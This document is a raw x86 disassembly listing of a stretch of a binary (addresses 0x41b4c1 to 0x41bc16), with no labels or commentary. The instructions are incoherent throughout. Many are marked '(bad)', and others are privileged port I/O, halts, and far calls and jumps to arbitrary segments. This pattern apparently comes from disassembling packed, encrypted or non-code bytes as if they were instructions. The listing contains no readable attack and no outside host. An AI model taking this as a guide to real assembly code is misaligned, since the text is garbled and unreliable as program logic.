  41b4c1:	(bad)  
  41b4c2:	push   edx
  41b4c3:	lea    ecx,[eax-0x328e7cf8]
  41b4c9:	jecxz  0x41b4ba
  41b4cb:	mov    dh,0x7c
  41b4cd:	cli    
  41b4ce:	push   ebx
  41b4cf:	retf   
  41b4d0:	in     al,dx
  41b4d1:	mov    eax,0x534b939a
  41b4d6:	mov    ?,WORD PTR [eax+edi*4-0x6a1899e]
  41b4dd:	in     al,0xee
  41b4df:	gs pushf 
  41b4e1:	xchg   esi,eax
  41b4e2:	or     al,0xcd
  41b4e4:	sub    eax,0xb4c93978
  41b4e9:	mov    eax,0x786fddc6
  41b4ee:	push   es
  41b4ef:	add    al,0xd6
  41b4f1:	pop    esi
  41b4f2:	in     al,0xd8
  41b4f4:	(bad)  
  41b4f5:	imul   edx,DWORD PTR [esi+edx*8+0x30],0x70
  41b4fa:	sub    DWORD PTR ds:0x2468e952,edx
  41b500:	xor    eax,0x8271b52c
  41b505:	rol    DWORD PTR [eax-0x63152d3d],1
  41b50b:	dec    esi
  41b50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b50d:	xchg   esp,eax
  41b50e:	inc    esi
  41b50f:	lock sbb ch,BYTE PTR [eax-0x18]
  41b513:	cwde   
  41b514:	jbe    0x41b4c6
  41b516:	ds (bad) 
  41b518:	mov    WORD PTR [edx-0x37],fs
  41b51b:	dec    ebx
  41b51c:	dec    esi
  41b51d:	push   ebp
  41b51e:	pushf  
  41b51f:	inc    BYTE PTR [edi-0x41]
  41b522:	aas    
  41b523:	fcompp 
  41b525:	fdivr  DWORD PTR [ebx+ebp*8+0xd]
  41b529:	out    dx,eax
  41b52a:	push   0x85f138ee
  41b52f:	xchg   ecx,eax
  41b530:	fnstsw WORD PTR [esi-0x3ae8249c]
  41b536:	add    DWORD PTR [edi+edi*1],ebx
  41b539:	jle    0x41b597
  41b53b:	push   cs
  41b53c:	mov    dh,0xfd
  41b53e:	jle    0x41b4d6
  41b540:	in     eax,dx
  41b541:	pusha  
  41b542:	cmc    
  41b543:	pop    es
  41b544:	cmp    BYTE PTR [ebx-0x12],0x81
  41b548:	retf   
  41b549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b54a:	sub    bh,BYTE PTR [edi+0x69]
  41b54d:	mov    esi,0x5df07a3d
  41b552:	(bad)  
  41b553:	dec    DWORD PTR [ebp-0x42041e5a]
  41b559:	xchg   edi,eax
  41b55a:	jmp    0x41b519
  41b55c:	pop    ss
  41b55d:	fidivr DWORD PTR [ecx-0x3d]
  41b560:	out    0x95,al
  41b562:	jne    0x41b54a
  41b564:	neg    BYTE PTR [edx]
  41b566:	(bad)  
  41b567:	sub    al,0xff
  41b569:	cmp    al,0x71
  41b56b:	test   eax,0x93867a81
  41b570:	inc    eax
  41b571:	inc    edi
  41b572:	call   0x9e17:0xc58deb32
  41b579:	cmp    al,0xc0
  41b57b:	es in  eax,0x8a
  41b57e:	ficom  WORD PTR [edx+0xe]
  41b581:	sub    dl,BYTE PTR [esi+0x3c6718fd]
  41b587:	xchg   esi,eax
  41b588:	or     BYTE PTR [esp+edx*1+0x518a01ce],dh
  41b58f:	and    DWORD PTR [esi-0x18],eax
  41b592:	add    cl,0xe0
  41b595:	shr    BYTE PTR [eax],0xce
  41b598:	je     0x41b5ae
  41b59a:	ds push edx
  41b59c:	fld    DWORD PTR [edx+0x1b511991]
  41b5a2:	mov    esi,DWORD PTR [ecx+0x33ae7a69]
  41b5a8:	mov    es,WORD PTR [ecx+0x38714a13]
  41b5ae:	adc    DWORD PTR [edx+0x1c],ecx
  41b5b1:	mov    ch,0xad
  41b5b3:	pop    eax
  41b5b4:	jae    0x41b5eb
  41b5b6:	xlat   BYTE PTR ds:[ebx]
  41b5b7:	(bad)  
  41b5b8:	into   
  41b5b9:	mov    al,0xb3
  41b5bb:	jnp    0x41b53e
  41b5bd:	(bad)  
  41b5be:	mov    edx,0xb6a06211
  41b5c3:	xor    DWORD PTR [edi],0x359c7e1c
  41b5c9:	call   FWORD PTR [ebx]
  41b5cb:	lods   al,BYTE PTR ds:[esi]
  41b5cc:	enter  0x5b94,0xbd
  41b5d0:	mov    dl,0xea
  41b5d2:	test   DWORD PTR [ecx-0x7b9a1ee7],eax
  41b5d8:	arpl   WORD PTR [eax+0x69],cx
  41b5db:	imul   eax,DWORD PTR [edx-0x7c],0x10
  41b5df:	dec    edx
  41b5e0:	push   esp
  41b5e1:	test   edx,edx
  41b5e3:	push   cs
  41b5e4:	test   al,0xdd
  41b5e6:	add    BYTE PTR [ecx-0x70939ea3],0x31
  41b5ed:	jb     0x41b5b6
  41b5ef:	sbb    cl,bl
  41b5f1:	jmp    0x41b61c
  41b5f3:	int3   
  41b5f4:	sbb    BYTE PTR [ecx-0x7acad8e6],dl
  41b5fa:	sub    DWORD PTR [eax+0x1ece64a6],esi
  41b600:	push   ebx
  41b601:	sti    
  41b602:	adc    al,0xa1
  41b604:	js     0x41b590
  41b606:	outs   dx,DWORD PTR ds:[esi]
  41b607:	cmp    edi,DWORD PTR [eiz*2+0x3ccf2de8]
  41b60e:	jns    0x41b5a5
  41b610:	addr16 lahf 
  41b612:	mov    edx,0x1d292d46
  41b617:	repnz mov dh,0xcf
  41b61a:	icebp  
  41b61b:	add    eax,0xc1273ecf
  41b620:	or     bl,BYTE PTR [ecx]
  41b622:	adc    al,0x25
  41b624:	aas    
  41b625:	dec    edi
  41b626:	(bad)  
  41b627:	add    al,0x48
  41b629:	pusha  
  41b62a:	cwde   
  41b62b:	int    0x75
  41b62d:	mov    ebp,0xd3c88a3e
  41b632:	inc    ebp
  41b633:	repz js 0x41b5e6
  41b636:	xchg   esp,eax
  41b637:	ss hlt 
  41b639:	add    dl,ah
  41b63b:	add    dh,cl
  41b63d:	out    dx,eax
  41b63e:	mov    DWORD PTR [edi-0x6e],eax
  41b641:	jb     0x41b629
  41b643:	push   ds
  41b644:	add    esp,DWORD PTR [eax]
  41b646:	sub    BYTE PTR [ecx+eax*1-0x423b4a63],dh
  41b64d:	cmp    DWORD PTR [ecx-0x2e],esi
  41b650:	inc    edx
  41b651:	adc    esp,DWORD PTR [eax-0x4bcb6675]
  41b657:	cvtpi2ps xmm1,QWORD PTR [edx-0x31]
  41b65b:	xor    ecx,eax
  41b65d:	mov    gs,WORD PTR [ebx]
  41b65f:	sub    edx,DWORD PTR [ecx+0x617b27e7]
  41b665:	and    BYTE PTR [ecx+0x27439569],ah
  41b66b:	push   esi
  41b66c:	test   al,0xea
  41b66e:	or     BYTE PTR [edi-0x24],0x1f
  41b672:	pop    eax
  41b673:	mov    ch,0x43
  41b675:	into   
  41b676:	iret   
  41b677:	das    
  41b678:	shr    BYTE PTR [esi-0x4b],cl
  41b67b:	sbb    BYTE PTR [ebx],ch
  41b67d:	cld    
  41b67e:	(bad)  
  41b67f:	fwait
  41b680:	sub    edi,DWORD PTR [esi-0x5]
  41b683:	pop    ss
  41b684:	pop    es
  41b685:	clc    
  41b686:	mov    esi,DWORD PTR [edi-0xf]
  41b689:	jb     0x41b682
  41b68b:	lea    ebp,[eax+0x3e6a790e]
  41b691:	pop    es
  41b692:	loopne 0x41b676
  41b694:	adc    esi,DWORD PTR [ebx]
  41b696:	pop    esi
  41b697:	push   esi
  41b698:	mov    esi,0x4a31cc02
  41b69d:	fwait
  41b69e:	sbb    al,0x60
  41b6a0:	jmp    0x13a1:0xa5696911
  41b6a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6a8:	push   ebx
  41b6a9:	and    eax,0xc60d4012
  41b6ae:	xchg   esi,eax
  41b6af:	or     al,0x5c
  41b6b1:	xchg   ecx,eax
  41b6b2:	mov    edx,0xe945a541
  41b6b7:	fmul   DWORD PTR [ebx]
  41b6b9:	or     ebx,0x306196f3
  41b6bf:	sbb    al,0x7f
  41b6c1:	dec    ecx
  41b6c2:	ret    
  41b6c3:	lock cmp ecx,edi
  41b6c6:	push   ds
  41b6c7:	fstp   st(3)
  41b6c9:	pop    edx
  41b6ca:	dec    DWORD PTR [edi]
  41b6cc:	(bad)  
  41b6ce:	movd   esi,mm1
  41b6d1:	pushf  
  41b6d2:	cmp    BYTE PTR [ecx-0x1e],dh
  41b6d5:	retf   
  41b6d6:	fimul  WORD PTR [ecx]
  41b6d8:	jl     0x41b72b
  41b6da:	test   al,0xc0
  41b6dc:	cmp    eax,0x10b3f7dd
  41b6e1:	cmp    dh,0x82
  41b6e4:	loope  0x41b729
  41b6e6:	or     bh,ch
  41b6e8:	lahf   
  41b6e9:	add    dh,BYTE PTR [edi-0x4b]
  41b6ec:	fstp   QWORD PTR [ebx]
  41b6ee:	ds hlt 
  41b6f0:	into   
  41b6f1:	dec    edi
  41b6f2:	jg     0x41b6b9
  41b6f4:	fimul  WORD PTR [esi-0x8]
  41b6f7:	add    DWORD PTR [edi+0x57],ebx
  41b6fa:	mov    bh,0x89
  41b6fc:	push   ecx
  41b6fd:	data16 jnp 0x41b733
  41b700:	xchg   bx,ax
  41b702:	ins    DWORD PTR es:[edi],dx
  41b703:	jbe    0x41b6cf
  41b705:	(bad)  
  41b706:	js     0x41b774
  41b708:	hlt    
  41b709:	push   esi
  41b70a:	loop   0x41b77c
  41b70c:	xchg   al,bh
  41b70e:	sub    DWORD PTR [esi],edi
  41b710:	pop    edi
  41b711:	cmp    eax,0x8f50a1e2
  41b716:	pop    ds
  41b717:	cmp    cl,BYTE PTR [edx+0x63]
  41b71a:	xor    BYTE PTR [ecx+0x508856b2],bl
  41b720:	add    al,0x8b
  41b722:	test   BYTE PTR [eax+0x63],cl
  41b725:	ja     0x41b777
  41b727:	imul   ebp,DWORD PTR [ecx],0xffffffac
  41b72a:	arpl   WORD PTR [ebp+0x56],ax
  41b72d:	fldenv [esi-0x65]
  41b730:	sub    DWORD PTR [ebx+0x3a],esi
  41b733:	or     eax,0xaa25b1b4
  41b738:	lds    ebx,FWORD PTR [eax]
  41b73a:	lock push ebp
  41b73c:	inc    edi
  41b73d:	pop    ecx
  41b73e:	or     esp,DWORD PTR [ebp-0x21d2fdab]
  41b744:	sbb    ch,BYTE PTR [edx+0x57]
  41b747:	loope  0x41b79d
  41b749:	rol    DWORD PTR [esi+eax*2],0xe2
  41b74d:	lock loop 0x41b7a1
  41b750:	add    DWORD PTR [ebx-0x7535cc7e],ebp
  41b756:	xor    eax,0xc9df5f5c
  41b75b:	idiv   ah
  41b75d:	sbb    DWORD PTR [esi],edi
  41b75f:	ds std 
  41b761:	pop    edx
  41b762:	cs imul ecx,ebp,0xfffffff1
  41b766:	stos   BYTE PTR es:[edi],al
  41b767:	loopne 0x41b73b
  41b769:	xchg   esi,eax
  41b76a:	arpl   WORD PTR [esi-0x33],cx
  41b76d:	mov    dl,0x85
  41b76f:	mov    eax,ds:0x19e3e74d
  41b774:	loopne 0x41b71a
  41b776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b777:	loopne 0x41b789
  41b779:	mov    ah,BYTE PTR [ebx-0x754d7673]
  41b77f:	add    al,0xbc
  41b781:	sbb    DWORD PTR [eax+0x4c],esp
  41b784:	cdq    
  41b785:	test   BYTE PTR [ebx-0x2b],al
  41b788:	mov    eax,ds:0x6e4b9066
  41b78d:	push   ds
  41b78e:	dec    ebx
  41b78f:	xchg   ecx,eax
  41b790:	mov    edi,0x8f1180a9
  41b795:	inc    ebp
  41b796:	inc    ecx
  41b797:	sbb    al,BYTE PTR [edx]
  41b799:	xor    ecx,DWORD PTR [ebx+ebp*8+0x1f9366f0]
  41b7a0:	aas    
  41b7a1:	mov    cl,0xc2
  41b7a3:	jbe    0x41b7bd
  41b7a5:	repz dec ebx
  41b7a7:	pop    ss
  41b7a8:	sbb    al,BYTE PTR [edx+0x3431bc46]
  41b7ae:	or     bl,0x83
  41b7b1:	cmp    dl,ch
  41b7b3:	or     DWORD PTR [ecx+0x41],eax
  41b7b6:	xor    al,0xf5
  41b7b8:	dec    eax
  41b7b9:	dec    eax
  41b7ba:	into   
  41b7bb:	ret    
  41b7bc:	jae    0x41b802
  41b7be:	pop    esp
  41b7c0:	adc    al,0x72
  41b7c2:	not    DWORD PTR [edi*8-0x4eb4093c]
  41b7c9:	jge    0x41b80f
  41b7cb:	rol    BYTE PTR [edi+ebx*2+0x262124d5],cl
  41b7d2:	add    BYTE PTR [ecx],dl
  41b7d4:	adc    ecx,ecx
  41b7d6:	stos   DWORD PTR es:[edi],eax
  41b7d7:	jnp    0x41b7bb
  41b7d9:	clc    
  41b7da:	das    
  41b7db:	push   es
  41b7dc:	lea    esp,[esi]
  41b7de:	push   0xd
  41b7e0:	rol    BYTE PTR [esi+0x74],cl
  41b7e3:	fisub  WORD PTR [ecx+0x1d36246d]
  41b7e9:	rol    BYTE PTR [esi-0x6b4e4b3b],cl
  41b7ef:	push   ecx
  41b7f0:	and    al,0xe7
  41b7f2:	lods   eax,DWORD PTR ds:[esi]
  41b7f3:	xchg   ecx,eax
  41b7f4:	add    eax,0xe94919cd
  41b7f9:	xchg   dh,ah
  41b7fb:	repz push edx
  41b7fd:	jp     0x41b7af
  41b7ff:	and    bh,BYTE PTR ds:0xd3260566
  41b805:	xchg   cl,ah
  41b807:	shl    BYTE PTR [ebx-0x2a33878c],0x8b
  41b80e:	push   edi
  41b80f:	jns    0x41b7f1
  41b811:	ret    0xfb84
  41b814:	jg     0x41b7ff
  41b816:	or     BYTE PTR es:0x3057476b,cl
  41b81d:	fidiv  WORD PTR [ecx-0xb]
  41b820:	cld    
  41b821:	push   es
  41b822:	pop    ds
  41b823:	jge    0x41b854
  41b825:	pop    esp
  41b826:	sti    
  41b827:	mov    dh,0x87
  41b829:	mov    eax,0x78a767f0
  41b82e:	repnz in eax,dx
  41b830:	daa    
  41b831:	adc    BYTE PTR [ecx+ebp*8+0x3a6cc2e3],dl
  41b838:	mov    ds:0x7f368691,al
  41b83d:	push   cs
  41b83e:	dec    ebx
  41b83f:	les    ebx,FWORD PTR [ebx-0x5b]
  41b842:	int    0x7a
  41b844:	or     BYTE PTR ds:0x9a200b99,bl
  41b84a:	or     BYTE PTR [ecx+0x38],al
  41b84d:	out    0x6e,al
  41b84f:	sbb    ebp,eax
  41b851:	push   0xc48d1154
  41b856:	(bad)  
  41b857:	shr    DWORD PTR [ecx+0x4b],cl
  41b85a:	ins    DWORD PTR es:[edi],dx
  41b85b:	sub    al,0x6b
  41b85d:	scas   eax,DWORD PTR es:[edi]
  41b85e:	mov    esi,0xc3f17740
  41b863:	aaa    
  41b864:	jg     0x41b850
  41b866:	(bad)  
  41b867:	pop    edi
  41b868:	repz ds jle 0x41b865
  41b86c:	cmp    DWORD PTR [ebx+0xe],0x965fe75c
  41b873:	fist   DWORD PTR [edi]
  41b875:	lds    eax,FWORD PTR [ecx]
  41b877:	jl     0x41b887
  41b879:	inc    edx
  41b87a:	pop    ds
  41b87b:	iret   
  41b87c:	stc    
  41b87d:	jb     0x41b84d
  41b87f:	cmp    BYTE PTR [esi*8+0x1a6e93e4],0x57
  41b887:	inc    edi
  41b888:	(bad)  
  41b889:	mov    esi,0x5d3733ff
  41b88e:	jge    0x41b906
  41b890:	out    dx,eax
  41b891:	inc    edi
  41b892:	mov    dh,cl
  41b894:	call   0x68a32dce
  41b899:	mov    edx,0xc1b66cc0
  41b89e:	mov    ch,0xe5
  41b8a0:	(bad)  
  41b8a1:	repnz mov edi,?
  41b8a4:	pinsrw mm7,WORD PTR [edx+0x6],0x7e
  41b8a9:	xchg   cl,ch
  41b8ab:	and    ch,dl
  41b8ad:	repz push cs
  41b8af:	aam    0x51
  41b8b1:	xchg   esp,eax
  41b8b2:	mov    es,edx
  41b8b4:	pop    ecx
  41b8b5:	and    al,0xa3
  41b8b7:	dec    ebx
  41b8b8:	push   ss
  41b8b9:	xchg   ebx,eax
  41b8ba:	cli    
  41b8bb:	dec    edi
  41b8bc:	fiadd  DWORD PTR [eax-0x68]
  41b8bf:	ja     0x41b88d
  41b8c1:	std    
  41b8c2:	xor    al,0xa9
  41b8c4:	iret   
  41b8c5:	cmp    bh,cl
  41b8c7:	mov    gs,edi
  41b8c9:	cwde   
  41b8ca:	test   DWORD PTR [esi+0x10c4b5d0],eax
  41b8d0:	push   ecx
  41b8d1:	jne    0x41b85b
  41b8d3:	push   es
  41b8d4:	lods   al,BYTE PTR ds:[esi]
  41b8d5:	push   ebp
  41b8d6:	pushf  
  41b8d7:	dec    ebx
  41b8d8:	loop   0x41b86d
  41b8da:	inc    ebx
  41b8db:	jmp    0x41b8f6
  41b8dd:	mov    BYTE PTR [ebp+0x4c],al
  41b8e0:	mov    ds:0x19291b05,al
  41b8e5:	cwde   
  41b8e6:	or     dl,BYTE PTR [ebx+0x636a0de2]
  41b8ec:	jno    0x41b8d0
  41b8ee:	pop    ecx
  41b8ef:	push   edx
  41b8f0:	inc    ebx
  41b8f1:	ins    DWORD PTR es:[edi],dx
  41b8f2:	pusha  
  41b8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8f4:	mov    esp,0x7b9ccf85
  41b8f9:	pushf  
  41b8fa:	jne    0x41b955
  41b8fc:	bound  esp,QWORD PTR [ebp+0x6d]
  41b8ff:	pushf  
  41b900:	cmp    BYTE PTR [edi],al
  41b902:	into   
  41b903:	pusha  
  41b904:	jne    0x41b8d4
  41b906:	push   eax
  41b907:	xchg   esp,eax
  41b908:	cmp    esp,DWORD PTR gs:[esp+edx*1-0x7ada4a75]
  41b910:	cmc    
  41b911:	pop    eax
  41b912:	sub    bh,BYTE PTR [ebx+ecx*8]
  41b915:	mov    ecx,0x1887b724
  41b91a:	(bad)  
  41b91b:	cwde   
  41b91c:	add    ch,BYTE PTR [edi+0x3c]
  41b91f:	dec    edx
  41b920:	call   0x8859:0x8930e04b
  41b927:	adc    BYTE PTR [ebx-0x2d],dh
  41b92a:	(bad)  
  41b92b:	loopne 0x41b936
  41b92d:	shl    DWORD PTR [edx],0x9a
  41b930:	out    0xd,al
  41b932:	mov    BYTE PTR [eax+0x69],al
  41b935:	dec    ebx
  41b936:	mov    ds:0x1f56b2ee,al
  41b93b:	(bad)  
  41b93c:	fsub   st(6),st
  41b93e:	mov    dl,0x56
  41b940:	push   esi
  41b941:	test   BYTE PTR [eax],dl
  41b943:	lock sbb eax,eax
  41b946:	ins    BYTE PTR es:[edi],dx
  41b947:	push   esp
  41b948:	mov    BYTE PTR [esi],dh
  41b94a:	sbb    DWORD PTR [esi-0x559def78],esp
  41b950:	jl     0x41b9ba
  41b952:	xlat   BYTE PTR ds:[ebx]
  41b953:	jmp    0x41b954
  41b955:	sub    ebx,DWORD PTR [edx]
  41b957:	xchg   edx,eax
  41b958:	and    DWORD PTR [edi+0x5123bcc],0x67aa42c4
  41b962:	idiv   cl
  41b964:	mov    ebx,0xcd53eb26
  41b969:	add    DWORD PTR [ebx-0x2d],0xffffffcf
  41b96d:	ins    DWORD PTR es:[edi],dx
  41b96e:	test   ah,bl
  41b970:	je     0x41b947
  41b972:	scas   eax,DWORD PTR es:[edi]
  41b973:	fsubp  st(1),st
  41b975:	outs   dx,DWORD PTR ds:[esi]
  41b976:	popf   
  41b977:	inc    edi
  41b978:	je     0x41b950
  41b97a:	mov    ds:0xfa90844d,al
  41b97f:	add    esi,DWORD PTR [edx]
  41b981:	lods   al,BYTE PTR ds:[esi]
  41b982:	xchg   edi,eax
  41b983:	lea    edi,[edi+0x51]
  41b986:	es enter 0x453d,0x91
  41b98b:	cld    
  41b98c:	push   esi
  41b98d:	cli    
  41b98e:	call   0x53d4:0xcd484a3
  41b995:	test   BYTE PTR [ecx],dl
  41b997:	and    eax,0xf30492a6
  41b99c:	pop    ecx
  41b99d:	mov    al,ds:0x2d463cae
  41b9a2:	jg     0x41b99e
  41b9a4:	stos   DWORD PTR es:[edi],eax
  41b9a5:	and    ebx,DWORD PTR [ebx+eax*4-0x65c1d0ed]
  41b9ac:	dec    eax
  41b9ad:	pop    ebx
  41b9ae:	inc    ecx
  41b9af:	pop    ecx
  41b9b0:	pop    edx
  41b9b1:	sbb    esi,DWORD PTR [ecx-0x4c314142]
  41b9b7:	aas    
  41b9b8:	push   DWORD PTR [edx]
  41b9ba:	bound  ecx,QWORD PTR [eax+0x72]
  41b9bd:	outs   dx,DWORD PTR ds:[esi]
  41b9be:	dec    ebx
  41b9bf:	sub    esp,DWORD PTR [ebx+0x2e]
  41b9c2:	lahf   
  41b9c3:	mov    edi,0x1795eca
  41b9c8:	fbstp  TBYTE PTR [esp+eax*8]
  41b9cb:	mov    WORD PTR [ebp+0x28],cs
  41b9ce:	push   es
  41b9cf:	xchg   ecx,eax
  41b9d0:	mov    BYTE PTR [edi+0x24782a64],dh
  41b9d6:	push   0x919a9887
  41b9db:	or     al,0x8
  41b9dd:	fisub  DWORD PTR [eax+0x43fa8e44]
  41b9e3:	test   al,0x5d
  41b9e5:	loop   0x41ba51
  41b9e7:	mov    bl,0x4e
  41b9e9:	inc    edi
  41b9ea:	ret    
  41b9eb:	xor    al,0xa4
  41b9ed:	xor    ecx,ebp
  41b9ef:	sub    eax,DWORD PTR [ebp-0x3b]
  41b9f2:	out    dx,al
  41b9f3:	sbb    edi,DWORD PTR [edi]
  41b9f5:	into   
  41b9f6:	not    BYTE PTR [ebx+0x27]
  41b9f9:	pop    esi
  41b9fa:	ja     0x41b9d3
  41b9fc:	mov    edi,0xba27ade3
  41ba01:	fnstsw WORD PTR [edi+0x6f5be177]
  41ba07:	lea    ebx,[edi-0xe82da61]
  41ba0d:	mov    bh,0x17
  41ba0f:	fadd   QWORD PTR [ecx]
  41ba11:	jl     0x41b9d1
  41ba13:	or     eax,0x22cf673f
  41ba18:	idiv   BYTE PTR [edx]
  41ba1a:	in     al,dx
  41ba1b:	inc    esp
  41ba1c:	int    0xe0
  41ba1e:	rol    DWORD PTR [edi-0x760144e2],1
  41ba24:	xchg   DWORD PTR [edi-0x14d26e02],esi
  41ba2a:	aaa    
  41ba2b:	xchg   esp,eax
  41ba2c:	test   eax,edx
  41ba2e:	inc    ebp
  41ba2f:	gs jae 0x41baaf
  41ba32:	xchg   ebx,eax
  41ba33:	mov    eax,0xfef39172
  41ba38:	aaa    
  41ba39:	rcl    ebp,1
  41ba3b:	push   es
  41ba3c:	cld    
  41ba3d:	adc    al,0xe7
  41ba3f:	pop    ecx
  41ba40:	mov    WORD PTR [edx-0x67ad9df6],ss
  41ba46:	out    dx,eax
  41ba47:	or     al,0x5e
  41ba49:	test   BYTE PTR [eax],ch
  41ba4b:	or     DWORD PTR [esi-0x59da20bc],0x68b41e92
  41ba55:	fist   DWORD PTR [edx+0x60]
  41ba58:	mov    DWORD PTR [ebp+0x47],ecx
  41ba5b:	xor    BYTE PTR [ebx+0x5a],dl
  41ba5e:	lea    ecx,[eax-0x5d]
  41ba61:	test   eax,0xf6a01fbe
  41ba66:	cs xor eax,0x10a138a4
  41ba6c:	repnz aam 0xdd
  41ba6f:	and    al,0xfb
  41ba71:	frstor [edx-0x4f]
  41ba74:	je     0x41ba8e
  41ba76:	mov    ch,0x78
  41ba78:	push   ebx
  41ba79:	loop   0x41bac3
  41ba7b:	jne    0x41ba7a
  41ba7d:	push   edx
  41ba7e:	test   DWORD PTR [ecx+0x6023e4f5],esp
  41ba84:	ja     0x41bad4
  41ba86:	icebp  
  41ba87:	in     al,dx
  41ba88:	jo     0x41ba4e
  41ba8a:	xchg   ecx,eax
  41ba8b:	shl    BYTE PTR [edx-0x13],cl
  41ba8e:	repnz cmp dh,BYTE PTR [edi]
  41ba91:	xchg   ebp,eax
  41ba92:	xchg   ecx,eax
  41ba93:	scas   al,BYTE PTR es:[edi]
  41ba94:	jge    0x41ba20
  41ba96:	ficomp DWORD PTR [edx-0x7a]
  41ba99:	in     eax,0x80
  41ba9b:	retf   0xa7a
  41ba9e:	cmp    eax,esp
  41baa0:	fnstenv [edx]
  41baa2:	xor    eax,0x9636e916
  41baa7:	xchg   edx,eax
  41baa8:	rcl    ch,cl
  41baaa:	pop    eax
  41baab:	int    0x40
  41baad:	xchg   esp,eax
  41baae:	mov    eax,0x5eaba23c
  41bab3:	mov    al,ds:0xa7060f8
  41bab8:	ins    DWORD PTR es:[edi],dx
  41bab9:	in     al,dx
  41baba:	xor    BYTE PTR [edx-0x7ceab4fc],bl
  41bac0:	push   0x644becd2
  41bac5:	sahf   
  41bac6:	push   ss
  41bac7:	xor    DWORD PTR [ebx],edx
  41bac9:	inc    esi
  41baca:	outs   dx,BYTE PTR ds:[esi]
  41bacb:	cdq    
  41bacc:	pop    ebx
  41bacd:	xchg   BYTE PTR [esi-0x251dce75],dl
  41bad3:	push   cs
  41bad4:	dec    ecx
  41bad5:	jae    0x41ba96
  41bad7:	push   0xcd3c8c48
  41badc:	test   DWORD PTR [eax-0x73],edi
  41badf:	es xor eax,0x3f2464f5
  41bae5:	es xor eax,0x181df492
  41baeb:	xchg   ebx,eax
  41baec:	inc    esi
  41baed:	stc    
  41baee:	xchg   edx,eax
  41baef:	pop    esi
  41baf0:	sbb    edx,DWORD PTR [eax]
  41baf2:	dec    esp
  41baf3:	dec    esp
  41baf4:	lea    edi,[edx]
  41baf6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41baf8:	push   es
  41baf9:	and    ebx,DWORD PTR [ebx-0x294b0e69]
  41baff:	out    0x73,eax
  41bb01:	push   edx
  41bb02:	xchg   edx,eax
  41bb03:	test   BYTE PTR [edx-0x6d],bh
  41bb06:	jmp    0xb34e:0xd0eb32f8
  41bb0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb0e:	dec    edi
  41bb0f:	dec    esi
  41bb10:	adc    DWORD PTR [edx-0x2b],esi
  41bb13:	and    DWORD PTR ds:0x145c0913,eax
  41bb19:	bnd jns 0x41bb80
  41bb1c:	add    esi,DWORD PTR [edi]
  41bb1e:	and    ch,BYTE PTR [eax+0x1511221a]
  41bb24:	ror    DWORD PTR [edx-0x66],0x8c
  41bb28:	fdiv   QWORD PTR [ebx+0x2db72490]
  41bb2e:	xchg   DWORD PTR [esp+ebx*2],edi
  41bb31:	hlt    
  41bb32:	call   0xeaf40244
  41bb37:	dec    eax
  41bb38:	ret    0x3607
  41bb3b:	xlat   BYTE PTR ds:[ebx]
  41bb3c:	fwait
  41bb3d:	mov    ah,0x20
  41bb3f:	xchg   esp,eax
  41bb40:	xchg   esi,eax
  41bb41:	xchg   ebp,eax
  41bb42:	js     0x41bb48
  41bb44:	cmp    eax,0xc2dee495
  41bb49:	lods   al,BYTE PTR ds:[esi]
  41bb4a:	arpl   WORD PTR [ebx+0x7d],di
  41bb4d:	xchg   DWORD PTR [ebx-0x29],eax
  41bb50:	adc    eax,0xc93eef9c
  41bb55:	shl    BYTE PTR [ebp+0x4c889358],0x41
  41bb5c:	jae    0x41baf5
  41bb5e:	gs push cs
  41bb60:	ss mov esp,cs
  41bb63:	xor    DWORD PTR [esi+0x6a2a6466],esp
  41bb69:	push   ebx
  41bb6a:	mov    bl,0x17
  41bb6c:	sbb    dl,BYTE PTR [esi-0x34]
  41bb6f:	push   ecx
  41bb70:	shl    WORD PTR [ecx],1
  41bb73:	(bad)  
  41bb74:	jno    0x41bb61
  41bb76:	loopne 0x41bb1d
  41bb78:	je     0x41bbeb
  41bb7a:	into   
  41bb7b:	mov    ecx,0x862863f9
  41bb80:	ret    
  41bb81:	xor    eax,0xbfca0474
  41bb86:	ja     0x41bb1e
  41bb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb89:	jg     0x41bb7d
  41bb8b:	fwait
  41bb8c:	mov    edi,0x7fdfeeff
  41bb91:	test   cl,0x13
  41bb94:	jmp    ebx
  41bb96:	jmp    0x41bb97
  41bb98:	cmc    
  41bb99:	xchg   edi,eax
  41bb9a:	jmp    0x41bc10
  41bb9c:	loop   0x41bbcd
  41bb9e:	jns    0x41bbdb
  41bba0:	jo     0x41bb80
  41bba2:	in     al,0xc0
  41bba4:	lods   eax,DWORD PTR ds:[esi]
  41bba5:	add    dl,bh
  41bba7:	jmp    0x9f29eddd
  41bbac:	cs (bad) 
  41bbae:	das    
  41bbaf:	xor    eax,0xe3f91e87
  41bbb4:	jae    0x41bc35
  41bbb6:	pop    ss
  41bbb7:	push   edi
  41bbb8:	jle    0x41bb57
  41bbba:	sub    ecx,DWORD PTR [ebp-0x6c99e9cf]
  41bbc0:	cmp    DWORD PTR [esi-0x3e360d66],esp
  41bbc6:	das    
  41bbc7:	adc    eax,DWORD PTR [edi+0x53]
  41bbca:	test   al,0xf6
  41bbcc:	sub    BYTE PTR [ebp-0x46],bh
  41bbcf:	jo     0x41bb7e
  41bbd1:	mov    ch,0xa8
  41bbd3:	inc    eax
  41bbd4:	push   ecx
  41bbd5:	jp     0x41bb5d
  41bbd7:	fsubrp st(1),st
  41bbd9:	or     ecx,DWORD PTR [edi+0x14a365c9]
  41bbdf:	ret    0x562a
  41bbe2:	sub    DWORD PTR [eax+0x69],0x60848da
  41bbe9:	imul   edx,DWORD PTR [esi+edx*2+0x585da22],0x60
  41bbf1:	xchg   ebp,eax
  41bbf2:	arpl   WORD PTR [esi],ax
  41bbf4:	aam    0x8
  41bbf6:	ror    DWORD PTR [eax],1
  41bbf8:	adc    eax,0x85f1f326
  41bbfd:	mov    es,WORD PTR [eax-0x7b9f9eef]
  41bc03:	inc    edx
  41bc04:	sub    al,0x5d
  41bc06:	pop    esi
  41bc07:	jno    0x41bbc6
  41bc09:	and    al,0x43
  41bc0b:	sbb    eax,0x8e78b0e7
  41bc10:	jo     0x41bc73
  41bc12:	cli    
  41bc13:	push   ecx
  41bc14:	dec    esi
  41bc15:	push   ds
  41bc16:	stc    
